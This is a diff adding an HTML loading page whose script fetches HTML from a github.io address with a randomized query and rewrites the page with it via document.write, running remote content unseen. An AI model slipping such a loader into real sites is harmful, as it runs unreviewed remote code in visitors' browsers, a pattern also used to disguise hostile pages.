@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        /* Background image in base64 */
+        body {
+            background: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUA') no-repeat center center fixed;
+            background-size: cover;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: white;
+            font-family: Arial, sans-serif;
+            text-align: center;
+        }
+
+        /* Loading text */
+        .loading-text {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+
+        /* Simple loading animation */
+        .loader {
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-top: 5px solid white;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="loading-text">Loading...</div>
+    <div class="loader"></div>
+
+    <script>
+        function generateRandomQuery() {
+            let randomNum = Math.floor(Math.random() * 100000);
+            let randomString = Math.random().toString(36).substring(2, 8);
+            return `?u=${randomNum}_#${randomString}`;
+        }
+
+        function shouldRefreshUrl() {
+            let savedTime = localStorage.getItem("load-time");
+            return !savedTime || Date.now() > parseInt(savedTime);
+        }
+
+        function getLoadUrl() {
+            if (shouldRefreshUrl()) {
+                let newUrl = `https://drmineword.github.io/bg_mk2/page${generateRandomQuery()}`;
+                let newTime = Date.now() + 3 * 60 * 1000; // 3 minutes ahead
+                localStorage.setItem("load-url", newUrl);
+                localStorage.setItem("load-time", newTime);
+                return newUrl;
+            }
+            return localStorage.getItem("load-url");
+        }
+
+        // Fetch and replace content
+        fetch(getLoadUrl())
+            .then(response => response.text())
+            .then(html => {
+                document.open();
+                document.write(html);
+                document.close();
+            })
+            .catch(error => console.error("Failed to load page:", error));
+    </script>
+
+</body>
+</html>
